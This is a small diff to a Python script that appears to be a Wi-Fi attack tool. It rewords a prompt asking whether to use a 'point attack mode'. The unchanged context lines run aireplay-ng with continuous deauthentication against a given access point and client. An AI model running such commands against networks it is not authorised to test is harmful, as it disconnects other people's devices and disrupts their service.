@@ -25,7 +25,7 @@ def find_ch(bssid):
     return ch
 
 def attack(bssid, interface):
-    q = input("Do you want your attack mode 1 user ? (y/n): ")
+    q = input("Do you want to use point attack mode? (y/n): ")
     if q.lower() == 'y':
         destination = input("Enter the Wi-Fi client essid: ")
         os.system(f"aireplay-ng --deauth 0 -a {bssid} -c {destination} {interface}")
